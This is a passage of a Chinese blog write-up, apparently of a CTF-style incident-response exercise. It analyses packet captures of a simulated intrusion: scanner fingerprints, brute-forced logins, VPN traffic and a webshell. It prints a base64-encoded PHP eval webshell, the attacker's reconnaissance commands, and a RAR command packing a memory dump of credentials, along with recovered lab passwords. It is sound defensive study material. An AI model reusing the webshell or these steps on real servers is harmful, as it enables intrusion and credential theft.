<psw>admin/admin!@#pass123</psw></li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码 <psw>a.php PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs/Pg==</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么 <psw>flag:87b7cb79481f317bde90c116cf36084b</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少 <psw>web/e667jUPvJjXHvEUv</psw></li><li>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip <psw>eth1 10.3.3.100</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么 <psw>d1c029893df40cb0f47bcf8f1c3c17ac</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#105;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#116;&#46;&#x63;&#111;&#x6d;">&#105;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#116;&#46;&#x63;&#111;&#x6d;</a>得到的密码是什么 <psw>edc123!@#</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username&#x2F;password） <psw>admin/admin!@#PASS123</psw></li><li>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是多少 <psw>10.3.4.3</psw></li></ol><h3 id="webone-pcap"><a href="#webone-pcap" class="headerlink" title="webone.pcap"></a>webone.pcap</h3><h4 id="识别扫描器"><a href="#识别扫描器" class="headerlink" title="识别扫描器"></a>识别扫描器</h4><p>协议分级中查看到http协议<code>100%</code>,那就直接查看http协议</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252352679.png" data-fancybox="true"/></div></div><p>一般扫描器的指纹会出现在<code>Conten-type</code>或<code>User-Agent</code>当中,所以将此两个字段应用为列</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353133.png" data-fancybox="true"/></div></div><p>大概看一下,将无危胁的过滤掉<code>http &amp;&amp; (http.request.method==&quot;GET&quot; || http.request.method==&quot;POST&quot;) &amp;&amp; http.content_type != &quot;application/x-www-form-urlencoded&quot;</code>即可发现<code>awvs</code>扫描器的指纹</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353293.png" data-fancybox="true"/></div></div><h4 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h4><p>直接定位状态码为301或者302的,登陆成功后会跳转嘛然后可以翻到<code>admin</code>字样的数据包</p><p><code>http.response.code==301 || http.response.code==302 &amp;&amp; http.response_for.uri matches &quot;admin&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353486.png" data-fancybox="true"/></div></div><p>得到结果:<code>http://192.168.32.189/admin/login.php?rec=login.php</code></p><h4 id="账号密码"><a href="#账号密码" class="headerlink" title="账号密码"></a>账号密码</h4><p>基本查询没什么好讲的,把长度排序,最特别的那个就很有可能是登录成功的,我们使用Burp爆破的时候也是看长度最特别的那个</p><p><code>http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri.query==&quot;rec=login&quot;&amp;&amp; ip.src==192.168.94.59</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353319.png" data-fancybox="true"/></div></div><h4 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h4><p>木马一般请求方式为<code>POST</code>,所以指定请求方式为<code>POST</code>.并且将暴力破解相关的流量筛选掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; ip.src == 192.168.94.59 &amp;&amp; http.request.method == <span class="string">&quot;POST&quot;</span> &amp;&amp; http.content_type!=<span class="string">&quot;acunetix/wvs&quot;</span> &amp;&amp;!(http.request.full_uri contains <span class="string">&quot;admin/login.php?rec=login&quot;</span>)</span><br><span class="line">&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;/admin/login.php?rec&quot;</span>)&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;css&quot;</span>)&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;js&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后就可以发现比较异常的文件:<code>a.php</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353551.png" data-fancybox="true"/></div></div><p>然后我们发现了密码是1234,并且是在请求体里的则根据此条件找出木马内容.使用<code>http contains &quot;$_POST[1234]&quot; </code>发现搜不到,那么尝试一下tcp,<code>tcp contains &quot;$_POST[1234]&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353647.png" data-fancybox="true"/></div></div><h4 id="分析WebShell行为"><a href="#分析WebShell行为" class="headerlink" title="分析WebShell行为"></a>分析WebShell行为</h4><p>定位<code>WebShell</code>相关的所有流量<code>http.request.uri==&quot;/images/article/a.php&quot; || http.response_for.uri  matches &quot;/images/article/a.php&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053145.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053653.png" data-fancybox="true"/></div></div><p>选择导出特定分组打开导出的文件进行追流分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载了 /var/www/html/images/article/20180807wwmhxi.png</span></span><br><span class="line"><span class="comment"># ls /var/www/html/images/</span></span><br><span class="line">article/2018-08-08 08:12:4940960777</span><br><span class="line">../2018-08-07 11:36:5540960777</span><br><span class="line">./2016-11-25 21:18:2740960777</span><br><span class="line">product/2018-07-04 09:12:0140960777</span><br><span class="line">upload/2016-11-25 21:18:2740960777</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /var/</span></span><br><span class="line"><span class="comment"># cd&amp;获取了当前路径</span></span><br><span class="line">/var/www/html/images/article</span><br><span class="line"><span class="comment"># ls /var/www/html/images/article</span></span><br><span class="line">../2016-11-25 21:18:2740960777</span><br><span class="line">./2018-08-08 08:12:4940960777</span><br><span class="line">a.php2018-08-08 08:12:49280644</span><br><span class="line">a.png2018-08-07 12:07:2363220644</span><br><span class="line">20180807wwmhxi.png2018-08-07 12:32:391402350644</span><br><span class="line">1533559002.png2018-08-07 12:07:1363220644</span><br><span class="line"><span class="comment"># ls /var/www/html/</span></span><br><span class="line"><span class="comment"># cat /var/www/html/flag.flag</span></span><br><span class="line">9f08594fc1dcd0059936196bf2d090b7</span><br><span class="line"><span class="comment"># cat /var/www/html/robots.txt</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /cache/</span><br><span class="line">Disallow: /data/</span><br><span class="line">Disallow: /include/</span><br><span class="line">Disallow: /install/</span><br><span class="line">Disallow: /languages/</span><br><span class="line">Disallow: /m/include/</span><br><span class="line">Disallow: /m/theme/</span><br><span class="line">Disallow: /theme/</span><br><span class="line">Disallow: /upgrade/</span><br><span class="line">Disallow: /captcha.php</span><br><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /var/www/html/product_category.php</span></span><br><span class="line"><span class="comment"># cat /var/www/html/index.php</span></span><br><span class="line"><span class="comment"># ls /var/www/html/include/</span></span><br><span class="line"><span class="comment"># cat /var/www/html/include/init.php</span></span><br><span class="line"><span class="comment"># ls /var/www/html/data/</span></span><br><span class="line">slide/2018-08-08 01:56:2440960777</span><br><span class="line">../2018-08-07 11:36:5540960777</span><br><span class="line">./2018-07-04 08:58:4540960777</span><br><span class="line">backup/2018-08-08 06:50:5140960777</span><br><span class="line">.config.php.swp2018-07-04 08:03:48122880777</span><br><span class="line">config.php2016-11-26 14:04:5610860777</span><br><span class="line">index.html2016-11-26 14:04:5610777</span><br><span class="line">system.dou2016-11-26 14:04:56680777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库操作:show tables from web</span></span><br><span class="line"><span class="comment"># select * from dou_show</span></span><br><span class="line"><span class="comment"># select * from dou_product_category</span></span><br><span class="line"><span class="comment"># select * from dou_article_category</span></span><br><span class="line"><span class="comment"># cd &quot;/var/www/html/images/article/&quot;;ls;echo [S];pwd;echo [E]</span></span><br><span class="line"><span class="comment"># cd &quot;/var/www/html/images/article/&quot;;ifconfig;echo [S];pwd;echo [E]</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599038 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032856 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476426339 (454.3 MiB)  TX bytes:1041835470 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>上面在分析的时候其实也查到了····<code>http.request.full_uri matches &quot;robots.txt&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529924.png" data-fancybox="true"/></div></div><h4 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h4><p>查询常见数据库端口<code>tcp.dstport==3306</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529969.png" data-fancybox="true"/></div></div><p>选择文件–&gt;导出特定分组,先将mysql的导出来</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529801.png" data-fancybox="true"/></div></div><p>然后打开mysql的流量看一下,并没有什么信息,这个是个Web网站,那账号密码有没有可能在配置文件里面,然后被黑客访问了呢~~~</p><p>那么涉及到配置文件必然会涉及到数据库名、用户名、密码,例如:<code> http contains &quot;database&quot; and http contains &quot;user&quot; and http contains &quot;name&quot;</code>或者<code> http contains &quot;database&quot;  || http contains &quot;user&quot; || http contains &quot;name&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260529818.png" data-fancybox="true"/></div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// database host</span></span><br><span class="line"><span class="variable">$dbhost</span>   = <span class="string">&quot;10.3.3.101&quot;</span>;</span><br><span class="line"><span class="comment">// database name</span></span><br><span class="line"><span class="variable">$dbname</span>   = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="comment">// database username</span></span><br><span class="line"><span class="variable">$dbuser</span>   = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="comment">// database password</span></span><br><span class="line"><span class="variable">$dbpass</span>   = <span class="string">&quot;e667jUPvJjXHvEUv&quot;</span>;</span><br><span class="line"><span class="comment">// table prefix</span></span><br><span class="line"><span class="variable">$prefix</span>   = <span class="string">&quot;dou_&quot;</span>;</span><br><span class="line"><span class="comment">// charset</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DOU_CHARSET&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">// administrator path</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ADMIN_PATH&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="comment">// mobile path</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_PATH&#x27;</span>,<span class="string">&#x27;m&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="网卡信息"><a href="#网卡信息" class="headerlink" title="网卡信息"></a>网卡信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599038 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032856 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476426339 (454.3 MiB)  TX bytes:1041835470 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure><h3 id="webtwo-pcap"><a href="#webtwo-pcap" class="headerlink" title="webtwo.pcap"></a>webtwo.pcap</h3><h4 id="hash-code"><a href="#hash-code" class="headerlink" title="hash_code"></a>hash_code</h4><p>发现只有MySQL协议,随便打开一个包看看格式和有哪些内容</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054632.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054324.png" data-fancybox="true"/></div></div><p>我们可以按照这个格式查一下<code>mysql.query matches &quot;hash_code&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054979.png" data-fancybox="true"/></div></div><p>右键追踪<code>TCP</code>流</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054929.png" data-fancybox="true"/></div></div><h4 id="ijnu密码"><a href="#ijnu密码" class="headerlink" title="ijnu密码"></a>ijnu密码</h4><p><code>mysql contains &quot;ijnu@test.com&quot;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054240.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271054382.png" data-fancybox="true"/></div></div><h3 id="mail-pcap"><a href="#mail-pcap" class="headerlink" title="mail*.pcap"></a>mail*.pcap</h3><p>协议分级,看看自己要关注那些协议和字段</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425614.png" data-fancybox="true"/></div></div><p>映入眼帘的就是一个敏感路径</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271425917.png" data-fancybox="true"/></div></div><p>根据敏感路径进行过滤<code>http.request.full_uri matches &quot;action=login&quot; ||http.response_for.uri  matches &quot;action=login&quot; </code>分析请求及响应信息</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426661.png" data-fancybox="true"/></div></div><p>发现一个<code>success:true</code>,右键追踪流,确实是登录成功了,但是没有请求体,估计是<code>Cookie</code>登录的.放弃QAQ不过又多了个筛选条件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426324.png" data-fancybox="true"/></div></div><p><code>http.request.full_uri matches &quot;action=login&quot; || (http.response_for.uri matches &quot;action=login&quot; &amp;&amp; data-text-lines matches &quot;&#123;\&quot;success\&quot;:true&#125;&quot;)</code></p><p>将<code>value</code>应用为列,排查一下,最终会发现只是都满足了<code>resquest</code>包含了<code>action=login</code>而已,打开另一个数据包进行排查</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426028.png" data-fancybox="true"/></div></div><p>可以发现爆破了<code>admin</code>的密码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426823.png" data-fancybox="true"/></div></div><p>追踪流,看着密码像<code>base64</code>编码,但是解不出来</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426119.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271426891.png" data-fancybox="true"/></div></div><p>那就在当前流找找,看看有没有加密函数,最后发现了加密函数,但是可惜的是损坏了,函数不完整,根据这个密钥去搜搜还有没有其他流量包</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427171.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427470.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427660.png" data-fancybox="true"/></div></div><p>可以得到以下信息:</p><ul><li><code>hash: md5(1234567812345678)</code>:<code>d959caadac9b13dcb3e609440135cf54</code></li><li><code>iv(偏移量):1234567812345678</code></li><li><code>模式:cbc</code></li><li><code>字符集:utf8</code></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271427513.png" data-fancybox="true"/></div></div><h3 id="vpn-pcap"><a href="#vpn-pcap" class="headerlink" title="vpn*.pcap"></a>vpn*.pcap</h3><p>PPTP原理</p><ul><li>PPTP客户机使用动态分配的TCP端口号，与PPTP服务器使用的保留TCP端口号123建立控制连接（PPTP控制连接携带PPTP呼叫控制盒管理信息，用于维护PPTP隧道）。</li><li>客户端与服务器通过控制连接来创建、维护、终止一条隧道。</li><li>PPP帧的有效载荷经过加密、压缩或是两者的混合处理。</li><li>使用通用路由封装GRE对PPP帧进行封装。</li><li>将PPP帧封装进IP数据报文中。通过IP网络如Internet或其他企业准用INTRANET灯发送给PPTP服务器。</li><li>服务器接收到PPTP数据包后进行常规处理。</li></ul><p>我们打开vpnone.pcap，发现vpnone.pcap应该只是在尝试登陆VPN.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535149.png" data-fancybox="true"/></div></div><p>查看vpntwo.pcap,在统计——&gt;IPV4中发现</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636985.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535440.png" data-fancybox="true"/></div></div><p><code>0.3.4.96 、10.3.4.55 、10.3.4.3</code>出现的次数.最多接着查看一下协议分级</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636495.png" data-fancybox="true"/></div></div><p>有smb服务,看看smb服务器的ip是哪个排除一下,可以看到原端口是445也就是smb的服务端口,那么服务器IP则为<code>10.3.4.96</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535310.png" data-fancybox="true"/></div></div><p>排除一些无用选项<code>!smp &amp;&amp; ip.src != 10.3.4.96</code>,发现了<code>ping</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636122.png" data-fancybox="true"/></div></div><p>可以看到<code>10.3.4.3</code>一直在主动<code>ping 10.3.4.55</code>可以确定<code>10.3.4.3</code>为黑客IP</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535607.png" data-fancybox="true"/></div></div><h3 id="WebShell-pcap"><a href="#WebShell-pcap" class="headerlink" title="WebShell.pcap"></a>WebShell.pcap</h3><p>将http导出为php,然后去分析包</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021939.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021084.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242022904.png" data-fancybox="true"/></div></div><p>导出后逐渐分析每个文件,会在config(25).php中发现敏感操作,类似于压缩文件包的操作</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242027433.png" data-fancybox="true"/></div></div><p>继续往下分析包,找他有没有下载嘛,发现config(31).php文件最大嘛,改后缀名,改成.rar,打开后发现有密码,再返回去看他是怎么压缩的包嘛,看看他有没有设置密码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242029927.png" data-fancybox="true"/></div></div><p>响应包是config(25).php,那么请求包盲猜24呗,打开后发现是url编码了,解码看一下</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031588.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031647.png" data-fancybox="true"/></div></div><p>发现他做了base64_encode嘛,那我们将每一个值都解码一下呗,发现z2解码后是命令</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242032000.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]</span></span><br></pre></td></tr></table></figure><p>查找帮助文档,发现-hp是设置密码,那么JJBoom就是密码呗</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242033231.png" data-fancybox="true"/></div></div><p>解压出来之后发现,是个gif图,但是打不开</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242034441.png" data-fancybox="true"/></div></div><p>拖进010查看一下发现文件头是mdmp</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242035170.png" data-fancybox="true"/></div></div><p>将后缀名改为mdmp,不知道mdmp是啥,Google一下</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242036349.png" data-fancybox="true"/></div></div><p>进去搜一下mdmp</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242037431.png" data-fancybox="true"/></div></div><p>那就跟着教程走嘛,发现分析出来的是某一台机器的账号密码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242019878.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="流量分析" scheme="https://jiangjiyue.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
